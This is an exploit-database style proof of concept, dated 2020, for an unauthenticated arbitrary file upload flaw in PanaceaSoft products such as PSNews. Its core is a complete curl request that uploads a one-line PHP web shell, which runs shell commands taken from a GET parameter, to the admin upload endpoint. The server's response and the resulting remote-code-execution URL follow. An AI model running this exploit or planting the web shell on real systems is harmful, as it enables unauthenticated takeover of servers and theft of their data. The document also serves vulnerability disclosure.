# Exploit Title: PanaceaSoft products Arbitrary File Upload/RCE
# Google Dork: NA
# Date: 25/5/2020
# Exploit Author: syfi
# Vendor Homepage: http://www.panacea-soft.com/
# Software Link: http://www.panacea-soft.com/
# Version: latest
# Tested on: Ubuntu
# CVE : NA

# Vulnerability Description: 
#   PanaceaSoft products (ex:PSNews, PS-Store, Flutter Store, etc) suffers from an Unauthenticated File Upload Vulnerability, this lead to Remote Code Execution (RCE) by uploading a malicious  PHP file.
#the vulnerability in UploadHandler.php (jquery)
# posting file to http://target//index.php/admin/fileupload/upload


#PoC PSNews 

$ curl -i -s -k -X $'POST' \
    -H $'Host: HOST' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:67.0) Gecko/20100101 Firefox/67.0' -H $'Accept: application/json, text/javascript, */*; q=0.01' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'X-Requested-With: XMLHttpRequest' -H $'Content-Type: multipart/form-data; boundary=---------------------------132875777438352085691040662542' -H $'Content-Length: 285' \
    --data-binary $'\x0d\x0a-----------------------------132875777438352085691040662542\x0d\x0aContent-Disposition: form-data; name=\"files[]\"; filename=\"1337.php\"\x0d\x0aContent-Type: application/octet-stream\x0d\x0a\x0d\x0a\x0d\x0a<?php echo shell_exec($_GET[\'zz\'].\' 2>&1\'); ?>\x0d\x0a-----------------------------132875777438352085691040662542--\x0d\x0a' \
    $'http://TARGETURI/psnews/index.php/admin/fileupload/upload'

response:
{"files":[{"name":"1337.php","size":48,"type":"application\/octet-stream","width":null,"height":null,"id":"imgafb6b26b03ebd342f850d050a302c0f5","description":null,"url":"http:\/\/TARGETURI\/psnews\/uploads\/1337.php","deleteUrl":"http:\/\/TARGETURI\/psnews\/index.php\/admin\/fileupload\/upload?file=1337.php&_method=DELETE","deleteType":"POST"}]}

RCE: http://TARGETURI/psnews/uploads/1337.php

#more details
# https://github.com/SyFi/PanaceaSoft-0day-Exploit
# twitter @syfi2k
# 0xSAUDI
